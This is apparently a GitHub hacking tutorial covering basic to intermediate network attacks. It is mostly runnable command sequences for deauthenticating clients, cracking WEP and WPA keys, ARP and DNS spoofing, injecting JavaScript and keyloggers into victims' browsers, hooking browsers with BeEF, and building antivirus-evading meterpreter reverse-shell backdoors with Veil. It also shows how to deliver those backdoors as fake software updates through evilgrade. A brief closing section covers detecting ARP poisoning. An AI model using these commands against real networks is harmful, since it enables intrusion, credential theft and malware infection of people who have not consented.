# Network-Hacking (Basic to intermediate)

# First Hit The Star🥰

This is an article for studying about network hacking related matters. All the contents here are for educational purposes only.

From here we will discuss basic to intermediate network hacking first and then we will discuss about advanced network hackiing and bypass meathods. At the last of this article you can get the link to advanced network hacking article. but first you must need to complete this one.

(This article is good for those who are intrested in reading and learning)


BASIC NETWORK HACKING (Wired & wireless)
===============================================================================================================
First we need a wireless adaptor for network hacking that support monitor mode and packet capturing and 5gz frequency.

To connect it to virtual box > Install extention pack for the machine and go to virtual os settings > usb > add usb > add the usb device and select remote=yes. That's all. Then start the os go to devices and make sure the device is checked.

(You can use VMware also).

MAC -permenent physical address asigned to network devices by the manufacturer to identify them in the same network. Each packet flowing in a network have a source mac and a destination mac.

Inorder to change the MAC address of an interface we need to change disable that interface.


▶️>		ifconfig wlan0 down


Now change the mac:


▶️>		ifconfig wlan0 hw ether 00:11:22:33:44:55   [mac address to change must start with 00]


Now re-enable the interface:


▶️>		ifconfig wlan0 up


now we successfully changed the mac of our interface......................................................


Data is send as packet in the air with a source and destination mac. So mac address is used as the identification of devices inside the local network.
	We can capture all the packets send in the air even if we dont have the mac address same as that of the destination mac. For this we need to make our interface in monitor mode.
	
	
Type iwconfig to see the all interfaces and its mode.

▶️>		iwconfig

If the mode is in managed it will only capture the packets only with destinnation mac as our mac. We need to cature all the packets. So we need to enable monitor mode:

▶️>		ifconfig wlan0 down

▶️> airmon-ng check kill [This kills all the process that interfear our process] [This will kill our internet connection also, but now we dont need a connection for pre-connection attacks]

▶️> iwconfig wlan0 mode monitor

▶️> ifconfig wlan0 up

Now we can capture all the packets flowing in the netowrk even if that is not directed to us. So we can do packet sniffing/capturing only if monitor mode is enabled.[Now the name of our interface may be changed from wlan0 to mon0]


▶️> airodump-ng mon0 [this will show all the wireless networks around us]

Now lets target a specific network to gather more info:

▶️> airodump-ng --bssid 08:00:27:c7:e1:36 --channel 2 --write test mon0 [This will store the information discovered in a file named test] [THIS WILL ALSO DISOVER THE CLIENTS CONNECTED TO THAT NETWORK. WE CAN SEE THEM IN THE 'STATION' SECTION. SO EVEN WITHOUT CONNECTING TO THAT  NETWORK WE ARE ABLE TO SEE THE CLIENTS ALSO😈️.]

In some cases we can see some devices under the probe section, they are the devices that trying to connect to that network.

Now stop the capturing to see the rresult. Our result will be stored in a .cap file withour filename test.




NOW WE WILL USE WIRESHARK TO ANALYZE THIS FILE.

>Wireshark >file >open  >>open the result file


we can see the device names that are connected to the network there(eg:samsung, apple etc...). So we can get a quick info about what computers are there and ehat os they use...
	
	

NOW LETS DO SOME DEAUTHENTICATION ATTACKS [disconnect any client from any network without connecting] (Works only in wireless network not on wired)
-----------------------------------------------------------------------------------------------------
For this we are going to pretend to be the client that we want to disconnect by changing our mac address to the mac address of the client and tell the router that i want to dissconnect from you and we are going to pretend as the router by changing our mac to routers mac and tell the client that u are request to disconnnect and i am disconnecting you.

We are going to use Aireplay-ng for that.


▶️> aireplay-ng --deauth 1000000000 -a 08:00:27:c7:e1:36 -c f8:00:65:g3:a2:98 mon0 
[1000000000 is the no: of deauthentication packets that we send. Give it a large number like this to keep sending for a large number of time.] 
[ -a is our mac and -c is the client/victims mac that we want to disconnect]
[Run 'airodump-ng --bssid 08:00:27:c7:e1:36 --channel 2 mon0' along with the deauth attack to see the devices connected to that network so that we can see the client disconnected from the network live]

-----------------------------------------------------------------------------------------------------

NOW THE PRE CONNECTION SECTION IS OVER...........LET'S MOVE ON TO GAINING ACCESS...⏩️⏩️


WEP[Wired Equivalent Privacy] CRACKING
--------------------------------------
WEP uses RC4 algorithm. In transmitting data, the transmitter uses a key to encrypt the data for each packet and send it to the client reciever, then the reciever device decrypt the gibrish data using that key.

To do that it generate a 24 bit initialization vector. That vector is added to the password of the network to the actual key. This generate a keystream and this keystream is used to encrypt the data. 

So kestream+the actual data = encrypted data send to air.

BUT THE WEAKNESS IS THAT IT ALSO SHARES THE INITIALIZATION VECTOR IN PLAIN TEXT WITH THE PACKET😂️.


We can use aircrack-ng to determine the key stream and can be used to crack to get the key. We need to capture large number of packet to capture the initialization vector to get the actual key.

We can capture that if the network is busy...


▶️> airodump-ng --bssid 08:00:27:c7:e1:36 --channel 2 --write filename mon0 [if the network is busy we can see the data is increasing at very speed. In the data column it is the no: of useful packets that contain a different initialization vetor that help us to crack the network. The higher no: of packets more likely to crack it.(98686 packets are enough in zsecurity tutorial)]

▶️> aircrack-ng filename.cap [This is the  result file we captured. This command will find the key for us] 
[The password will shown as an ASCII password, just copy paste it and connect to the network....Some times we dont get the ascii in that case we can see a key like a mac address...Just remove the columns between them and connect with it]


Here we saw that our network must be busy, so if a netowrk is not busy we need to overcome it my making it  busy...[if a network is not busy,the data section will be 0 or slowly increase].


To see the changes live run airodump-ng against the networks just like erlier(▶️airodump-ng --bssid 08:00:27:c7:e1:36 --channel 2 --write filename mon0)

Now inorder to increase the data packet flow we need to tell the device that we want to communicate with it with a fake authentication attack(Not connecting, just fake auth):


▶️> aireplay-ng --fakeauth 0 -a 08:00:27:c7:e1:36 -h f8:00:65:g3:a2:98 mon0 [-a is the mac of target network -h is the mac of our wireless adaptor. The mac of the wireless adaptor is the first 12 digits seen after UNSPEC seccion, because of enabling monitor mode, also replace the - with :] (This sends a authentication reques or association reques or the ACK)


Now we can communicate with the network, because our mac is associated with it...It won't ignore us. Now we can force the access pint to generate initialization vectors sending.


WE ARE GOING TO DO A arp replay attack TO INCREASE THE NO: OF DATA:


▶️> aireplay-ng --arpreplay -b 08:00:27:c7:e1:36 -h f8:00:65:g3:a2:98 mon0 [-b is the target network] (Wait for it to capture an arp packet)
(Do this immediately after associating/fakeauth with the network)

After enough number of data packets recieved crack it with aircrack-ng as before:
▶️> aircrack-ng filename.cap


Another method to inncrease the flow of data packet is the korek chop chop attack:

First start airodump-ng against the network to see the data flow live as we did erlier(also store it as a file to crack it later)

Then do a fakeauth attack before to associate with the network

Then start the attack:

▶️> aireplay-ng --chopchop -b 08:00:27:c7:e1:36 -h f8:00:65:g3:a2:98 mon0 (Do ifconfig wlan0 to get the mac address of our adapttor)


Now next step is to forge fake packets:

▶️> packetforge-ng -0 -a 08:00:27:c7:e1:36 -h f8:00:65:g3:a2:98 -k 255.255.255.255 -l 255.255.255.255 -y replay-dec.xor -w chopchop-forged-packet [-k is the destination ip -l is the source ip, reply-dec.xor is the file we created in the previous step(chopchop attack), chopchop-forged-packet is the name of the forge packet that is gonna be created]


Now we need to inject the forged packet to the network......Do a fakeauth attack before that and do it:

▶️> aireplay-ng -2 -r chopchop-forged-packet mon0

Now also the no: of packets will increase.

Then crack the .cap file with aircrack-ng to get the key.



WE CAN USE FRAGMENTATION ATTACK FOR PACKET INJECTION BEHALF OF THESE 2 MEATHODS(Study from internet if want)

Its exactly the ssame as before chop chop attack obtain the fragment and inject it:

▶️> aireplay-ng --fragment -b 08:00:27:c7:e1:36 -h f8:00:65:g3:a2:98 mon0 

Now inject the captured fragment.

---------------------------------------



WPA/WPA2 CRACKING
---------------------------------------
Cracking wpa/wpa2 is challengiing than wep, however let's have a look at the feature that can be used to get the key without cracking the actual algorithm:
That is the WPS 

So the wps must be enabled on the network. Also it needs to be misconfigured- means It will not work the push button is enabled(So wps must be enabled and push button must be disabled). If push button is enabled it will reject all of our pins.


In many cases wps is disbled and push button is enabled by default, in that case we can't exploit it, but since wpa/wpa2 cracking is so challenging...just check that wps is enabled.(Sometimes wps locks after some failed attempts)


▶️> wash --interface mon0 [shows all wps enabled network around us]

Now we need to associate with the access point so that the ap will not ignore our attempts.

▶️> aireplay-ng --fakeauth 30 -a 08:00:27:c7:e1:36 -h 04:00:14:t3:j9:12 mon0 [30 is the delay time bw the association attempts, so we will associate with the AP every 30 seconds, -a is target mac, -h is our adaptor mac]

▶️> reaver --bssid 08:00:27:c7:e1:36 --channel 2 --interface mon0 -vvv --no-associate [This will bruteforce the network and give us the key]
Do these all in seperate 3 terminals.




NOW IF WPS IS DISABLED OR CONFIGURED TO USE A PUSH BUTTON THE ABOUVE METHOD WILL NOT WORK, SO NOW WE NEED TO CRACK ACTUAL WPA/WPA2 ENCRYPTION.

Ass the packets send in the air only contain temporary infoe, they are not useful to us. The only useful to us is the handshake.



First of all run airodump-ng against all networks as we did first to get the mac.

Now run airodump-ng against our target networks and store them in a file as we did before:

▶️> airodump-ng --bssid 08:00:27:c7:e1:36 --channel 2 --write wpahandshake mon0

Now we need to wait for to capture the handshake [A handshake is captured when a new client device connect to the network, so we need to wait for that]

(For tricking users to connect to network, we can use deauthentication attack to discconnect a client and he will connect again 😉️) > aireplay-ng --deauth  4 -a 08:00:27:c7:e1:36 -c 04:00:46:c7:e1:89 mon0

WHEN THE CLENT CONNECTS HANDSHAKE WILL BE CAPTURED AND AIRODUMP-NG WILL SHOW THE HANDSHAKE HAS BEEN CAPTURED IN THE SCREEN


The handshake not contain data to recover the key, but it conatin data to check a password is valid or not. So we need to use a wordlist with the handshake and check the passwords are valid or not.


Use crunch to generate a wordlist:

▶️> crunch [min][max][charecters] -t [pattern] -o [filename]

  > crunch 6 8 123abc$ -o wordlist.txt -t a@@@@b (create combinations of 1,2,3,a,b,c and $  which start with a and b and combinations put between them)
  

Now we are ready to go with the handshake and wordlist:

▶️> aircrack-ng wpahandshake.cap -w wordlist.txt

(We can also use online checker where we can upload the handshake and they have huge wordlist)

-----------------------------------------


NOW THE GAINING ACCESS SECTION IS OVER...NEXT THE POST CONNECTION ATTACKS⏩️⏩️
----------------------------------------------------------------------------------------------------------->>

INFORMATION GATHERING.....

▶️> netdiscover -r 192.168.1.1/24 [My orginal ip was 192.168.1.71, as i am 71th start from the first device that is 192.168.1.1  -  This is how we specify a range] [This will show the devices connected to our network]


NEXT WE USED ZENMAP TO SCAN. WE JUST PUT THE IP RANGE (192.168.1.1/24) IN THE TEXT BOX AND SELECT APPROPRIATE OPTIONS AND JUST SCAN.
OR MANNUAL COMMANDS:

▶️> nmap -sn 192.168.1.1/24 [ping scan]

▶️> nmap -T4 -F 192.168.1.1/24 [quick scan]

▶️> nmap -sV -T4 -O -F --version-light 192.168.1.1/24 [quick scan plus]

--------------------------------



MAN IN THE MIDDLE ATTACKS
-------------------------------

There are many ways to do mitm. First we discuss about arp spoofing.

In arp spoofing, it allows us to redirect the flow of packets. So the users data will flow through our computer to the router insted of directly going to the router.


This is possible because arp is not very secure. It allow us to link ip adress to mac address.

Assume we know ip address of a computer, now our computer sends an arp request like 'who has the ip 10.16.1.7'. All other will reject the request except the one device that actually has the ip.

Now that device will send an arp response like 'I have the ip 10.16.1.7 and my mac is 00:87:b6:89:98'. Now we get the mac of our target and now we can communicate with the device since the communication i a local network is via mac address. As we seen arp is very simple protocol as it has only requests and responses.


So arp links ip to mac

We  can see our own arp table or the link of our ip and mac by the command 'arp -a'


Now we are going to exploit the arp protocol that:

we sends 2 arp responses, one to the router and one to the victim.
	we tell the gateway router that i am at the ip of the victim. So the arp table of router update our mac with the victim ip and the packet flow through our computer.  Then we tell the victim that i am at the router ip, then it will associate the router ip with our own mac, now also the packet flows through us. (So in arp protocol accept all our request without any verification. so it is not secure)
	
	
THE RESULT IS THAT THE ROUTER THINK I AM THE VICTIM AND THE VICTIM THINK I AM THE ROUTER. [So now we are in the middle of the connection]


⏺️NOW LETS USE ARP SPOOF TO DO THIS:


▶️> arpspoof -i eth0 -t 10.0.2.7 10.0.2.1 [-i is the interface that connected to the target network(if it is wlan0 give it wlan0. here it is eth0),  -t is the target device to mitm , at  last 10.0.2.1 is the gateway ip of the router]

THE ABOVE COMMAND WILL SPOOF THE TARGET TELLING HIM THAT I AM THE ROUTER...

▶️> arpspoof -i eth0 -t 10.0.2.7 10.0.2.1

WE RUN THE EXACT SAME COMMAND BY INTERCHANGING THE IP. HERE WE SPOOF THE ROUTER THAT I AM THE TARGET

SO WE NEED TO RUN THE 2 COMMANDS AT SAME TIME TO SUCCESSFULLY DO AN ARP SPOOFING.


NOW ONE THING MORE...OUR COMPUTER IS NOT A ROUTER, SO WHEN IT RECIEVES REQUEST  IT DOES NOT ACCEPT IT AND DOES NOT ALLOW TO FLOW THROUGH IT. WE NEED TO TO PORT FORWARDING:

▶️> echo 1 > /proc/sys/net/ipv4/ip_forward

----------------------------------
NOW THE MITM.....(apt install mitmf) [No need of running arpspoof before this, because this automaticilly start an arp spoof attack and sniffer for us, so all we have to run is the following command]

▶️> mitmf --arp --spoof --gateway 10.20.1.71 --target 10.20.14.206 -i eth0 [--gateway is the ip of our router, then the target ip and then the interface if it is wlan0 put it as wlan0]


[Normally this work on http websites and sniff datas, but luckly mitmf has its own sslstrip and it will start automatically with the above command. If it was not we need to be manually set it up]
Again there is one exception, website that use HSTS (hsts is used by facebook, paypal, gmail etc...). The way this work is the browser adds the sites that must only load with https, so if we do anything and bypass with ssl it will not happen. Till now there is no method, so search after sometime to check if there is a way to bypass it.

-------------------

DNS SPOOFING.........

DNS is a server that converts domain names to the ip adress of the site.

Since we are in the man in the middle, we have a dns server running in our computer and we can resolve dns requests the way we want.

So if they request any domain we can assign a new fake our own ip and that will be loaded in victim.


[in our kali machine we have a server. Start it by 'service apache2 start' . And the webpage will be in /var/www/html] [if we browse our local ip after starting apache2 we can see the webpage]

Now lets configure the dns server that comes in with the mitmf tool:


▶️> gedit /etc/mitmf/mitmf.conf

There we can see something like this, find this part:

	[[[A]]]     #queries for ipv4 address records
	
	*.thesprawl.org=192.168.178.27
	
	*.live.com=10.20.14.201
	
This is A records and these are responsible for translating domain to ip.

*.live.com=10.20.14.201 --->> This line means any subdomain to live.com should be redirected to 10.20.14.201. Thats our own ip by default. We can put any other ip there and the requests will be redirected there.

▶️> mitmf --arp --spoof --gateway 10.20.1.71 --target 10.20.14.206 -i eth0 --dns


Now the dns spoofing is started. So according to our config, if we go to live.com we will be redirected to our local ip, so the apache2 page in the /var/www/http will be displayed.

So we can modify and replace the values.
-------------------------

NOW LETS USE SOME PLUGINS IN MITMF JUST FOR FAMILIARIZE WITH IT:

▶️> mitmf --arp --spoof --gateway 10.20.1.71 --target 10.20.14.206 -i eth0 --screen --intervel 10 (Take screen short of the target machine every 10 sec)

▶️> mitmf --arp --spoof --gateway 10.20.1.71 --target 10.20.14.206 -i eth0 --screen (take screen shorts continuesly)

[screenshorts will be in /var/log/mitmf]


Plugins can be found with just mitmf --help, use it like this.


▶️> mitmf --arp --spoof --gateway 10.20.1.71 --target 10.20.14.206 -i eth0 --jskeylogger (Another plugin to inject a key logger)

----------------------------


CODE INJECTION.......

---------------------

Lets see how to inject javascript code to target browser(We can use the same method to inject html code)


▶️> mitmf --arp --spoof -i eth0 --gateway 10.20.1.71 --targets 10.20.14.206 --inject --js-payload "alert('test');"

This will display an alert popup when target browses any webpage.

Just google for javascript payloads like screeshort, redirecter, steal cookies....

It will be hard to write it through the command. so we can put it in a file and use it:


make a .js file > put the javascript/html code there and save it >>

▶️> mitmf --arp --spoof -i eth0 --gateway 10.20.1.71 --targets 10.20.14.206 --inject --js-file /root/filename.js (Just makesure to put the full path)


[Note: its only possible to inject js to http pages. Anyway there are methods, lets cover it in advanced part]

---------------------



BEEF FRAMEWORK....

-----------------------------------
Click the beef icon > There will show the ui url pannel > open the link in browser to access the beef UI pannel.

username = beef  ; password = beef


in the terminal there also shows an example, copy the script 

[<script src="http://10.0.2.6:3000/hook.js"></script> this will be the hook script. Make an html file and put the script inside and if victim opens the html page he will be hooked. Use apache2 service for that or use java script injection in mitmf or any other ideas.]

------------------------------------

[⏺️ALL THESE ATTACKS, IF YOU ARE DOING IN A REAL NETWORK..MAKE SURE TO USE AN EXTERNAL WIRELESS ADAPTOR. SO WLAN0 WILL BE THERE, DEACTIVATE ETH0 WILE WLAN0 WILL EXIST. BECAUSE BOTH INTERFACE AT SAME TIME MAY CREATE SOME ISSUES, SO IN REAL NETWORK USE ONLY WLAN0 AND DEACTIVATE ETHO ]


WIRESHARK............

--------------------------------
Wireshark is not a hacking tool. All it does is to analyze all the packets flowing through our interface. So all the traffic is ours normally.

But we saw when we do mitm attack the victim's data flow through our computer/interface, so we can also analyze that with wireshark.

You can filter the packets like http, or post/get requests etc....

-------------------------------

FAKE ACCESS POINT CREATING...........

-----------------------------
Here we dont need to do anything more like arp spoofing or anything, we just need to create our fake AP and when clients connect we can directly start sniffing with wireshark and do anything we want.

Requirement: An interface connected  to internet (eth0, wlan0, or any virtual interface with internet access) And a wifi interface must.

The wifi interface must be able to brodcast the signal for the network. So this need to be act as an Access point.


[Best wirelsess adaptors : https://youtu.be/0lqRZ3MWPXY]


We need to configure sometthings, like we need to configure our wireless card to forward the connection to our interface connected to internet.

[Our network has internet connection(eth0...), the other interface or the wireeless adaptor is used for brodcasting signal to act as an Access Point.]


Lets study how to configure this mannually in the advanced part, for now lets see a great way of quikly creating an access point. We use a tool called mana toolkit for this.


MANA has 3 start scripts:

	1. start-noupstresm.sh   ---> Start fake AP with no internet access
	2. start-nat-simple.sh   ---> Start fake Ap with internet access
	3. start-nat-full.sh     ---> Start fake AP with internet access, and automatically start sniffing data and bypassing https.

WE ALWAYS USE 2ND ONE THAT'S START-NAT-SIMPLE.SH, BECAUSE 3RD ONE FAILS A LOT AND WE ALREADY KNOW HOW TO SNIFF AND BYPASS HTTPS MANUALLY.

RIGHT NOW WE ARE CONNECTED TO NAT NETWORK, THERE IS NO PROBLRM IN THAT.

So now we have an interfacee that connected to the internet( in my case  it's eth0). We dont care what type is it.

Now we need the wireless adaptor (wlan0). It must be in managed mode not in monitor mode and must not connect to the internet or any network. This is very important.


Install mana toolkit : ▶️> apt-get install mana-toolkit

Now we need to modify some configs:

	nano /etc/mana-toolkit/hostapd-mana.conf
	
	
The first thing to look is the interface [ it is the interface that we want to brodcast the signal]

Then the ssid [This will be the name of our fake wifi network]

Then the next file we want to modify is :

	nano /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
Now we need to modify:

	the upstram interface [ This is the interface of our that has internet access]
	The nexxt one thats the phy [The interface that brodcast the signal / our wireless card to create fake AP]
	
THAT'S ALL... WE ARE READY TO START THE FAKE AP


▶️> bash start-nat-simple.sh

( in some case we need to put the path also, if we install it wit apt install mana-toolkit the command will be ▶️> bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh

or if we install it from github the command will be ▶️> bash mana/run-mana/start-nat-simple.sh )


MANA TOOL-KIT AND MITMF MAY NOT BE AVAILABLE IN KALI REPO AND MAY NOT BE INSTALLABLE WITH APT INSTALL, SO GO TO THEIR GITHUB AND INSTALL IT.

----------------------------------



VEIL FRAMEWORK.......

---------------------
https://github.com/Veil-Framework/Veil.git

cd config

./setup.sh --silent --force

now start veil by ./Veil.py


or do:

	apt -y install veil
	/usr/share/veil/config/setup.sh --force --silent

Lets make a payload for a windows pc


It hast 2 main tools type ▶️> list    to see it

it shows evasion and ordance

Evasion generates undetectable backdoors for us

Ordance generates the payloads that used by evasion


	Available Tools:

	  1)  Evasion
	  2)  Ordnance
	  
▶️> use 1

▶️> list [shows all payloads]

	
Now it shows the available payloads:

eg: go/meterpreter/rev_https.py

it is divided into 3 parts, first part is the language(here go lang), 2nd part is the type of the payload, 3rd part is the method used to establish connection.


Now we neet to set the payload 

▶️> use 15

 
Now we need to set the options. There we need to set the ip of the metasploit handler, thatt means the ip to which the connection is recieving. So we need to set the ip address which the payload will try to connect back to, in our case we wantto recieve connection back to our computer.

So we set the ip lhost to our ip.

▶️> set LHOST 10.20.14.213

▶️> set LPORT 80

[ As the victim connects via port 80, there is nothing suspecious there, it look like the victim connect to a website ]

But if we have a service running on port 80 kill the process or set the port to another one like:

	▶️> set LPORT 8080 [8080 is also used by webservers, so its still not suspecious, it will still bypasss firewalls ]
	
	
▶️> options

make sure everything is ok. If we do like this will bypass every antivirus except AVG. We need to bypass that also.

How antivirus works is they have a huge collection of signatures, they compare our signatures to or file and if it matches any signatures it will flag it as a malware.

What we are going to do is, we are going to modify our file as much as we can to make it more unique.

Veil is alredy doing this like it obfuscates it, encrypting it, it injects in the memmory so it doesnt get detected.


But just make some differecnce in some optional options.

First modify the proccessors:

▶️> set PROCESSORS 1  [its just the minimum no: of processors, dont make it a huge number, just put it as 1]

Then set the time:

▶️> set SLEEP 6    [this is the time that takes by  teh payload before executing]


Now we modified some optional things just to make our payload different.


▶️> options

Make sure everything is ok


▶️> generate


[ scan the file with 'no distribute virus scanner'. Because it dosent share our signature with other antivirus programms, if we do with virus total it will share it with other antivirus programs, so dont do it with virus total, use no distribute ]


Also make veil update always. So update it before use.


If it detcted by any antivirus, try to make some changes in the options untill it gets undtected.



Now we need to use metasploit. [we uses metasploit for listen for incomming connetions from our meterpreter payload]

	▶️> msfconsole
	▶️> use exploit/multi/handler
	▶️> show options
	▶️> set PAYLOAD windows/meterpreter/reverse_https   [ this payload is the meterpreter payload that we generated befor, so we set it]
	▶️> set LHOST 10.20.14.213
	▶️> set LPORT 8080

[the payload, lhost and the port must be same as that of the payload we created bofore]

▶️> show options

Make sure everything is ok


▶️> exploit

Now metasploit is listening for incomming connection, now when anyone opens the payload will be connected.



Now as this is a network hacking course lets use a method to deliver the payload:

[ we must be in the man in the middle ]

lets create a fake update.


Lets do dns spoofing with arp poisoning


Now we are in the same network of the victim (wired or wireless, no matters)

We will use a tool called evil grade which will act as a server to produce fake updates.


	https://github.com/infobyte/evilgrade.git

	cd evilgrade
	cpan Data::Dump
	cpan Digest::MD5
	cpan Time::HiRes
	cpan RPC::XML
	sometime it gives an error about gnu.pm remove it by:
	apt-get remove libterm-readline-gnu-perl
	and reinstall again:
	apt-get install libterm-readline-gnu-perl
	
	
Evilgrade is simalar to use like metasploit

	▶️> ./evilgrade
	▶️> show modules
	▶️> configure dap  (dap is the module's name)
	▶️> show options
	▶️> set agent /var/www/html/backdoor.exe  (set agent to our backdoor file/the programm to install as the update in target and path)
	▶️> show options
	▶️> start


Now basically anytime evilgrade get a request for an update, it will tell whoever is requesting for an update that there is an update and it will server the backdoor as the update.


There we can see an option called virtual host and there will be a link. Thats the link of the update. So we need to redirect the victim to that link.
Lets to dns spoofing for that:

	▶️> nano /etc/mitmf/mitmf.conf
	▶️> change dns port to 5353 because evilgrade uses that  pory
	Now go to the [[[A]]] part as we did far erlier:
	update.speedbit.com=10.200.14.201 (this is our own ip and update.speedbit.com is the virtual host url.)
	
▶️> mitmf --arp --spoof --gateway 10.20.14.1 --target 10.20.14.206 -i eth0 --dns


Now we need  to listen on the connection using metasploit like before:

	▶️> msfconsole
	▶️> use exploit/multi/handler
	▶️> show options
	▶️> set PAYLOAD windows/meterpreter/reverse_https   [ this payload is the meterpreter payload that we generated befor, so we set it]
	▶️> set LHOST 10.20.14.213
	▶️> set LPORT 8080
	▶️> exploit
	
	
so here our programm checks for updates using updates.speedbit.com, the update is being redirected to our ip address where the evigrade is running and it will say there is an update and our backdoor will be delvered.


When target opens our dap payload and check for updates they will download our backdoor.

 ---------------------------
 
 
 
 
 HOW TO  DETECT ARP POISONING ATTACKS........?
 
 ---------------------------------------------
 Check our computers arp table by command 'arp -a'
 
 Find the mac andd ip association of the gateway. make sure the mac and ip of the gateway/router is the same of it.
 
 So if arp poisoning is affected by us, the mac address of the router will change with the mac address of the  attaker.
 
 
 example:
 
 	Before --->  192.168.1.1     52:34:b5:r3:43:33    Dynamic
 	After  --->  192.168.1.1     00:11:22:33:44:55   Dynamic
 
 So incase if we are affected the attacker will be in the middle of our connection.
 
 THIS IS THE MANNUAL METHOD.
 
 
NOW THERE IS A TOOL CALLED XARP WILL DO THIS AUTOMATICALLLY. [available for linux and windows]

https://xarp.net/#downloadhttps://xarp.net/#download

Download and open the tool

If something suspicious will happen it will show us


We can also use wireshark to do this.

In Edit > preferences > protocols > arp/rarp > detect arp request storms > ok

Start capturing

If something will happen it will show there,

Goto  Analyze > expert information  to see some info


HOW TO PREVENT IT:

------------------

if we do an arp -a we can see our mac will be dynamic, so it can be changed.

so make it static to prevent arp poisoning, so attacker cant change the mac.

The problem is that, every time we connnect to a network, everytime there is a new device connecting to our network, we will have to manually configure that devie to work in our network, so if is in a big companny its too hard. If its a small company or house this will be a good solution.


There are also switches that monitor this and notify us.



<--------------------- END OF BASIC NETWORK HACKING --------------------->

✅LINK TO NETWORK HACKING ADVANCED : https://github.com/WH1T3-E4GL3/Network-Hacking-advanced

~whxite
